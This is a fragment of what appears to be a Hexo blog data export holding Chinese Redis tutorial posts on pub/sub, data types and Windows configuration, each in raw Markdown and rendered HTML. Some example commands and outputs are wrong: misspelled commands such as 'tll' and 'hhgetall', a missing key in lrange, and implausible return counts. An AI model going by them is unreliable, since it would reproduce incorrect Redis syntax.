class=\"string\">\"first\"</span></span><br><span class=\"line\">3) <span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"退订-UNSUBSCRIBE\"><a href=\"#退订-UNSUBSCRIBE\" class=\"headerlink\" title=\"退订(UNSUBSCRIBE)\"></a>退订(UNSUBSCRIBE)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;unsubsribe  first </span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"unsubsribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 0</span><br></pre></td></tr></table></figure>\n<h3 id=\"按模式订阅和退订-PSUBSCRIBE和PUNSUBSCRIBE\"><a href=\"#按模式订阅和退订-PSUBSCRIBE和PUNSUBSCRIBE\" class=\"headerlink\" title=\"按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)\"></a>按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)</h3><p>每个模式以 <em> 作为匹配符，比如 it</em> 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)。 news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类</p>"},{"title":"redis学习3 数据类型","date":"2016-03-02T16:00:00.000Z","desc":"redis 数据类型","_content":"redis数据类型\n* String\n* List\n* Hashes\n* Sets\n* Sorted sets\n<!-- more -->\n## String\n存值取值:\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379>GET yanbin\n\"redis\"\n```\n查询是否存在及删除\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379>exists yanbin\n(integer) 1\n```\n设置失效时间及查询失效剩余时间\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379> expire yanbin 500\n(integer) 1\n127.0.0.1:6379>tll yanbin \n(integer) 495\n```\n## List\n列表是简单的字符串列表，可以排序插入顺序,可以在头部或列表的尾部Redis的列表添加元素。\n``` bash\n127.0.0.1:6379>rpush yanbin a b c\n(integer) 3\n127.0.0.1:6379>lpush yanbin 1\n(integer) 1\n127.0.0.1:6379>lrange 0 -1\n1)\"1\"\n2)\"a\"\n3)\"b\"\n4)\"c\"\n127.0.0.1:6379>lpop yanbin\n\"1\"\n127.0.0.1:6379>rpop yanbin\n\"c\"\n127.0.0.1:6379>lrange 0 -1\n1)\"a\"\n2)\"b\"\n127.0.0.1:6379>llen yanbin\n(integer) 2\n```\n## Hashes\n哈希值是字符串字段和字符串值之间的映射，可以表示对象的数据类型。\n其实实际应用中用json格式做数据保存，可以表示对象。\n``` bash\n127.0.0.1:6379>hmset user:1000 username antirez birthyear 1977 verified 1\nok\n127.0.0.1:6379>hget user:1000 username\n\"antirez\"\n127.0.0.1:6379>hhgetall user:1000\n1)\"username\"\n2)\"antirez\"\n3)\"birthyear\"\n4)\"1977\"\n4)\"verified\"\n4)\"1\"\n```\n\n## Sets\n集合是一个无序的字符串合集,且不允许重复的成员。\n``` bash\n127.0.0.1:6379>sadd yanbin 1 2 3\n(integer) 5\n127.0.0.1:6379>smembers yanbin\n1)\"1\"\n2)\"2\"\n3)\"3\"\n127.0.0.1:6379>scard yanbin\n(integer) 3\n```\n\n## Sorted sets\n有序集合是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。有序集合的成员是唯一的,但分数(score)却可以重复。\n``` bash\n127.0.0.1:6379>zadd yanbin 1 a 2 b 3 c\n(integer) 5\n127.0.0.1:6379>zrange yanbin 0 -1\n1)\"a\"\n2)\"b\"\n3)\"c\"\n127.0.0.1:6379>zrange yanbin 0 -1 withscores\n1)\"a\"\n2)\"1\"\n3)\"b\"\n4)\"2\"\n5)\"c\"\n6)\"3\"\n127.0.0.1:6379>zcard yanbin\n(integer) 3\n```","source":"_posts/redis-3.md","raw":"---\ntitle: redis学习3 数据类型\ndate: 2016-3-3\ndesc: redis 数据类型\n---\nredis数据类型\n* String\n* List\n* Hashes\n* Sets\n* Sorted sets\n<!-- more -->\n## String\n存值取值:\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379>GET yanbin\n\"redis\"\n```\n查询是否存在及删除\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379>exists yanbin\n(integer) 1\n```\n设置失效时间及查询失效剩余时间\n``` bash\n127.0.0.1:6379>SET yanbin redis\nok\n127.0.0.1:6379> expire yanbin 500\n(integer) 1\n127.0.0.1:6379>tll yanbin \n(integer) 495\n```\n## List\n列表是简单的字符串列表，可以排序插入顺序,可以在头部或列表的尾部Redis的列表添加元素。\n``` bash\n127.0.0.1:6379>rpush yanbin a b c\n(integer) 3\n127.0.0.1:6379>lpush yanbin 1\n(integer) 1\n127.0.0.1:6379>lrange 0 -1\n1)\"1\"\n2)\"a\"\n3)\"b\"\n4)\"c\"\n127.0.0.1:6379>lpop yanbin\n\"1\"\n127.0.0.1:6379>rpop yanbin\n\"c\"\n127.0.0.1:6379>lrange 0 -1\n1)\"a\"\n2)\"b\"\n127.0.0.1:6379>llen yanbin\n(integer) 2\n```\n## Hashes\n哈希值是字符串字段和字符串值之间的映射，可以表示对象的数据类型。\n其实实际应用中用json格式做数据保存，可以表示对象。\n``` bash\n127.0.0.1:6379>hmset user:1000 username antirez birthyear 1977 verified 1\nok\n127.0.0.1:6379>hget user:1000 username\n\"antirez\"\n127.0.0.1:6379>hhgetall user:1000\n1)\"username\"\n2)\"antirez\"\n3)\"birthyear\"\n4)\"1977\"\n4)\"verified\"\n4)\"1\"\n```\n\n## Sets\n集合是一个无序的字符串合集,且不允许重复的成员。\n``` bash\n127.0.0.1:6379>sadd yanbin 1 2 3\n(integer) 5\n127.0.0.1:6379>smembers yanbin\n1)\"1\"\n2)\"2\"\n3)\"3\"\n127.0.0.1:6379>scard yanbin\n(integer) 3\n```\n\n## Sorted sets\n有序集合是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。有序集合的成员是唯一的,但分数(score)却可以重复。\n``` bash\n127.0.0.1:6379>zadd yanbin 1 a 2 b 3 c\n(integer) 5\n127.0.0.1:6379>zrange yanbin 0 -1\n1)\"a\"\n2)\"b\"\n3)\"c\"\n127.0.0.1:6379>zrange yanbin 0 -1 withscores\n1)\"a\"\n2)\"1\"\n3)\"b\"\n4)\"2\"\n5)\"c\"\n6)\"3\"\n127.0.0.1:6379>zcard yanbin\n(integer) 3\n```","slug":"redis-3","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltt000tg2x6u0o4ak59","content":"<p>redis数据类型</p>\n<ul>\n<li>String</li>\n<li>List</li>\n<li>Hashes</li>\n<li>Sets</li>\n<li>Sorted sets<a id=\"more\"></a>\n<h2 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h2>存值取值:<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;GET yanbin</span><br><span class=\"line\"><span class=\"string\">\"redis\"</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>查询是否存在及删除<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;exists yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br></pre></td></tr></table></figure></p>\n<p>设置失效时间及查询失效剩余时间<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt; expire yanbin 500</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;tll yanbin </span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 495</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"List\"><a href=\"#List\" class=\"headerlink\" title=\"List\"></a>List</h2><p>列表是简单的字符串列表，可以排序插入顺序,可以在头部或列表的尾部Redis的列表添加元素。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;rpush yanbin a b c</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br><span class=\"line\">127.0.0.1:6379&gt;lpush yanbin 1</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;lrange 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;lpop yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;rpop yanbin</span><br><span class=\"line\"><span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;lrange 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;llen yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 2</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Hashes\"><a href=\"#Hashes\" class=\"headerlink\" title=\"Hashes\"></a>Hashes</h2><p>哈希值是字符串字段和字符串值之间的映射，可以表示对象的数据类型。<br>其实实际应用中用json格式做数据保存，可以表示对象。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;hmset user:1000 username antirez birthyear 1977 verified 1</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;hget user:1000 username</span><br><span class=\"line\"><span class=\"string\">\"antirez\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;hhgetall user:1000</span><br><span class=\"line\">1)<span class=\"string\">\"username\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"antirez\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"birthyear\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"1977\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"verified\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Sets\"><a href=\"#Sets\" class=\"headerlink\" title=\"Sets\"></a>Sets</h2><p>集合是一个无序的字符串合集,且不允许重复的成员。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;sadd yanbin 1 2 3</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 5</span><br><span class=\"line\">127.0.0.1:6379&gt;smembers yanbin</span><br><span class=\"line\">1)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"2\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"3\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;scard yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Sorted-sets\"><a href=\"#Sorted-sets\" class=\"headerlink\" title=\"Sorted sets\"></a>Sorted sets</h2><p>有序集合是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。有序集合的成员是唯一的,但分数(score)却可以重复。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;zadd yanbin 1 a 2 b 3 c</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 5</span><br><span class=\"line\">127.0.0.1:6379&gt;zrange yanbin 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;zrange yanbin 0 -1 withscores</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"2\"</span></span><br><span class=\"line\">5)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">6)<span class=\"string\">\"3\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;zcard yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>redis数据类型</p>\n<ul>\n<li>String</li>\n<li>List</li>\n<li>Hashes</li>\n<li>Sets</li>\n<li>Sorted sets","more":"<h2 id=\"String\"><a href=\"#String\" class=\"headerlink\" title=\"String\"></a>String</h2>存值取值:<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;GET yanbin</span><br><span class=\"line\"><span class=\"string\">\"redis\"</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>查询是否存在及删除<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;exists yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br></pre></td></tr></table></figure></p>\n<p>设置失效时间及查询失效剩余时间<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;SET yanbin redis</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt; expire yanbin 500</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;tll yanbin </span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 495</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"List\"><a href=\"#List\" class=\"headerlink\" title=\"List\"></a>List</h2><p>列表是简单的字符串列表，可以排序插入顺序,可以在头部或列表的尾部Redis的列表添加元素。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;rpush yanbin a b c</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br><span class=\"line\">127.0.0.1:6379&gt;lpush yanbin 1</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">127.0.0.1:6379&gt;lrange 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;lpop yanbin</span><br><span class=\"line\"><span class=\"string\">\"1\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;rpop yanbin</span><br><span class=\"line\"><span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;lrange 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;llen yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 2</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Hashes\"><a href=\"#Hashes\" class=\"headerlink\" title=\"Hashes\"></a>Hashes</h2><p>哈希值是字符串字段和字符串值之间的映射，可以表示对象的数据类型。<br>其实实际应用中用json格式做数据保存，可以表示对象。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;hmset user:1000 username antirez birthyear 1977 verified 1</span><br><span class=\"line\">ok</span><br><span class=\"line\">127.0.0.1:6379&gt;hget user:1000 username</span><br><span class=\"line\"><span class=\"string\">\"antirez\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;hhgetall user:1000</span><br><span class=\"line\">1)<span class=\"string\">\"username\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"antirez\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"birthyear\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"1977\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"verified\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Sets\"><a href=\"#Sets\" class=\"headerlink\" title=\"Sets\"></a>Sets</h2><p>集合是一个无序的字符串合集,且不允许重复的成员。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;sadd yanbin 1 2 3</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 5</span><br><span class=\"line\">127.0.0.1:6379&gt;smembers yanbin</span><br><span class=\"line\">1)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"2\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"3\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;scard yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Sorted-sets\"><a href=\"#Sorted-sets\" class=\"headerlink\" title=\"Sorted sets\"></a>Sorted sets</h2><p>有序集合是string类型元素的集合,且不允许重复的成员。不同的是每个元素都会关联一个double类型的分数。redis正是通过分数来为集合中的成员进行从小到大的排序。有序集合的成员是唯一的,但分数(score)却可以重复。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1:6379&gt;zadd yanbin 1 a 2 b 3 c</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 5</span><br><span class=\"line\">127.0.0.1:6379&gt;zrange yanbin 0 -1</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;zrange yanbin 0 -1 withscores</span><br><span class=\"line\">1)<span class=\"string\">\"a\"</span></span><br><span class=\"line\">2)<span class=\"string\">\"1\"</span></span><br><span class=\"line\">3)<span class=\"string\">\"b\"</span></span><br><span class=\"line\">4)<span class=\"string\">\"2\"</span></span><br><span class=\"line\">5)<span class=\"string\">\"c\"</span></span><br><span class=\"line\">6)<span class=\"string\">\"3\"</span></span><br><span class=\"line\">127.0.0.1:6379&gt;zcard yanbin</span><br><span class=\"line\">(<span class=\"built_in\">integer</span>) 3</span><br></pre></td></tr></table></figure></p>"},{"title":"redis学习1 环境及配置","date":"2016-02-27T16:00:00.000Z","desc":"redis 配置","_content":"最近工作需要使用redis，现在只能边学习边总结。Redis的介绍就不说了，网上一搜一大把。\n\n## 环境搭建\n官方不提供windows版redis，[微软开源技术的github](https://github.com/MSOpenTech)上有提供，可以[下载](https://github.com/MSOpenTech/redis/releases)。下载解决之后，我们就开始可以搭建开发环境。\n<!-- more -->\n\n### 配置\n* maxheap\n这个是一个强限制，maxheap的大小包括文件存储大小及内存存储大小。如果超过这个限制，服务就会结束。\n* maxmemory\nmaxheap必需要比maxmemory大，一般设置为maxmemory的1.5倍。\n* 文件系统大小\nredis官方提供的公式:\n``` \n(size of physical memory) + (2 * size of maxheap)\n```\n如果你有一台机器内存为8G,maxheap设置为8G，那么你至少要有这么多空闲硬盘空间:\n``` \n(8GB) + (2 * 8GB) = 24GB\n```\n* maxmemory-policy\n如果运行中达到了maxmemory，redis将根据这个设置清除一些存储数据。\n* requirepass \n设置服务密码。\n* heapdir\n内存映射文件路径\n* timeout\n连接超时时间\n\n### 运行\n启动服务\n``` cmd\nredis-server redis.windows.conf\n```\n启动客户端\n``` cmd\nredis-cli -h 127.0.0.1 -p 6379 -a password\n```\n### 基本命令\n``` cmd\nset key value \nget key\ndel key\nexists key\nexpire key 100\nkeys *\ndb size\nttl key\ninfo\nflushdb \nping\n```\n","source":"_posts/redis-1.md","raw":"---\ntitle: redis学习1 环境及配置\ndate: 2016-2-28\ndesc: redis 配置\n---\n最近工作需要使用redis，现在只能边学习边总结。Redis的介绍就不说了，网上一搜一大把。\n\n## 环境搭建\n官方不提供windows版redis，[微软开源技术的github](https://github.com/MSOpenTech)上有提供，可以[下载](https://github.com/MSOpenTech/redis/releases)。下载解决之后，我们就开始可以搭建开发环境。\n<!-- more -->\n\n### 配置\n* maxheap\n这个是一个强限制，maxheap的大小包括文件存储大小及内存存储大小。如果超过这个限制，服务就会结束。\n* maxmemory\nmaxheap必需要比maxmemory大，一般设置为maxmemory的1.5倍。\n* 文件系统大小\nredis官方提供的公式:\n``` \n(size of physical memory) + (2 * size of maxheap)\n```\n如果你有一台机器内存为8G,maxheap设置为8G，那么你至少要有这么多空闲硬盘空间:\n``` \n(8GB) + (2 * 8GB) = 24GB\n```\n* maxmemory-policy\n如果运行中达到了maxmemory，redis将根据这个设置清除一些存储数据。\n* requirepass \n设置服务密码。\n* heapdir\n内存映射文件路径\n* timeout\n连接超时时间\n\n### 运行\n启动服务\n``` cmd\nredis-server redis.windows.conf\n```\n启动客户端\n``` cmd\nredis-cli -h 127.0.0.1 -p 6379 -a password\n```\n### 基本命令\n``` cmd\nset key value \nget key\ndel key\nexists key\nexpire key 100\nkeys *\ndb size\nttl key\ninfo\nflushdb \nping\n```\n","slug":"redis-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltu000ug2x6s7l9xpfq","content":"<p>最近工作需要使用redis，现在只能边学习边总结。Redis的介绍就不说了，网上一搜一大把。</p>\n<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>官方不提供windows版redis，<a href=\"https://github.com/MSOpenTech\" target=\"_blank\" rel=\"external\">微软开源技术的github</a>上有提供，可以<a href=\"https://github.com/MSOpenTech/redis/releases\" target=\"_blank\" rel=\"external\">下载</a>。下载解决之后，我们就开始可以搭建开发环境。<br><a id=\"more\"></a></p>\n<h3 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h3><ul>\n<li>maxheap<br>这个是一个强限制，maxheap的大小包括文件存储大小及内存存储大小。如果超过这个限制，服务就会结束。</li>\n<li>maxmemory<br>maxheap必需要比maxmemory大，一般设置为maxmemory的1.5倍。</li>\n<li>文件系统大小<br>redis官方提供的公式:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(size of physical memory) + (2 * size of maxheap)</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>如果你有一台机器内存为8G,maxheap设置为8G，那么你至少要有这么多空闲硬盘空间:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(8GB) + (2 * 8GB) = 24GB</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>maxmemory-policy<br>如果运行中达到了maxmemory，redis将根据这个设置清除一些存储数据。</li>\n<li>requirepass<br>设置服务密码。</li>\n<li>heapdir<br>内存映射文件路径</li>\n<li>timeout<br>连接超时时间</li>\n</ul>\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>启动服务<br><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-server redis.windows.conf</span><br></pre></td></tr></table></figure></p>\n<p>启动客户端<br><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h <span class=\"number\">127</span>.<span class=\"number\">0</span>.<span class=\"number\">0</span>.<span class=\"number\">1</span> -p <span class=\"number\">6379</span> -a password</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"基本命令\"><a href=\"#基本命令\" class=\"headerlink\" title=\"基本命令\"></a>基本命令</h3><figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">set</span> key value </span><br><span class=\"line\">get key</span><br><span class=\"line\"><span class=\"built_in\">del</span> key</span><br><span class=\"line\">exists key</span><br><span 